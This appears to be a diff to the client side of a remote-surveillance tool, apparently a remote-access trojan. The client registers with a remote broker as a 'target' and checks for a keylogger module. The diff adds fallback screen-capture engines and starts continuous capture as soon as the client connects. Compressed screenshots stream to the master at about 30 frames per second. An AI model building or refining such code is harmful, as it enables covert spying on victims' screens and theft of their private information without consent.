@@ -139,6 +139,10 @@ def run_client(master_url):
     except: KEYLOG_READY = False
     try: import GPUtil; GPU_READY = True
     except: GPU_READY = False
+    try: import pyautogui; PYAUTOGUI_READY = True
+    except: PYAUTOGUI_READY = False
+    try: from PIL import ImageGrab; IMAGEGRAB_READY = True
+    except: IMAGEGRAB_READY = False
 
     # Connect with both transports allowed
     sio = client_sio.Client(logger=True, engineio_logger=True)
@@ -155,52 +159,63 @@ def run_client(master_url):
                 if not client_state['screen']:
                     time.sleep(0.5)
                     continue
+
                 try:
                     monitors = sct.monitors
                     idx = client_state['monitor']
                     if idx >= len(monitors): idx = 1
                     monitor = monitors[idx]
-                    
-                    # Use MSS but fallback to PIL if needed
-                    img_data = sct.grab(monitor)
-                    if not img_data or img_data.size[0] < 10: raise ValueError("Empty Frame")
-                    img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
-                    
-                    # Emergency Shrink (50% size / 15% quality)
-                    new_size = (int(img.width * 0.5), int(img.height * 0.5))
-                    img = img.resize(new_size, Image.NEAREST)
-                    
-                    buffer = BytesIO()
-                    img.save(buffer, format='JPEG', quality=15, optimize=True)
-                    img_b64 = base64.b64encode(buffer.getvalue()).decode()
-                    
-                    sio.emit('screen_frame', {
-                        'image': img_b64,
-                        'timestamp': time.time(),
-                        'width': monitor['width'],
-                        'height': monitor['height']
-                    })
-                    print(f"Sent Frame: {len(img_b64)} bytes")
-                except Exception as ex:
-                    # Emergency Fallback to PIL
+
+                    # --- Triple Engine Capture ---
+                    img = None
                     try:
-                        from PIL import ImageGrab
-                        img = ImageGrab.grab()
-                        img = img.resize((int(img.width * 0.5), int(img.height * 0.5)), Image.NEAREST)
+                        # Engine 1: MSS (Ultra-Fast)
+                        img_data = sct.grab(monitor)
+                        if img_data:
+                            img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
+                    except: pass
+                    
+                    if not img and IMAGEGRAB_READY:
+                        try:
+                            # Engine 2: PIL (Reliable)
+                            img = ImageGrab.grab()
+                        except: pass
+                    
+                    if not img and PYAUTOGUI_READY:
+                        try:
+                            # Engine 3: PyAutoGUI (Legacy)
+                            img = pyautogui.screenshot()
+                        except: pass
+
+                    if img:
+                        # Live Video Compression (50% size / 20% quality)
+                        new_size = (int(img.width * 0.5), int(img.height * 0.5))
+                        img = img.resize(new_size, Image.NEAREST)
                         buffer = BytesIO()
-                        img.save(buffer, format='JPEG', quality=15)
+                        img.save(buffer, format='JPEG', quality=20, optimize=True)
                         img_b64 = base64.b64encode(buffer.getvalue()).decode()
-                        sio.emit('screen_frame', {'image': img_b64, 'timestamp': time.time()})
-                        print(f"Fallback PIL Frame Sent: {len(img_b64)} bytes")
-                    except:
-                        logger.debug(f"Capture error: {ex}")
+                        
+                        sio.emit('screen_frame', {
+                            'image': img_b64,
+                            'timestamp': time.time(),
+                            'width': monitor.get('width', 1920),
+                            'height': monitor.get('height', 1080)
+                        })
+                        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔥 LIVE FRAME: {len(img_b64)} B")
+                    
+                except Exception as ex:
+                    logger.debug(f"Capture error: {ex}")
                     time.sleep(0.1)
-                time.sleep(0.05)
+                time.sleep(0.03) # Cap at ~30 FPS
 
     @sio.event
     def connect():
         logger.info("CONNECTED to Broker! Authenticating...")
         sio.emit('register', {'role': 'target'})
+        # START ENGINE IMMEDIATELY (Fixes Black Screen Race Condition)
+        client_state['capturing'] = True
+        if not any(t.name == "CaptureThread" for t in threading.enumerate()):
+            threading.Thread(target=capture_loop, daemon=True, name="CaptureThread").start()
 
     @sio.on('request_init')
     def on_request_init(data):
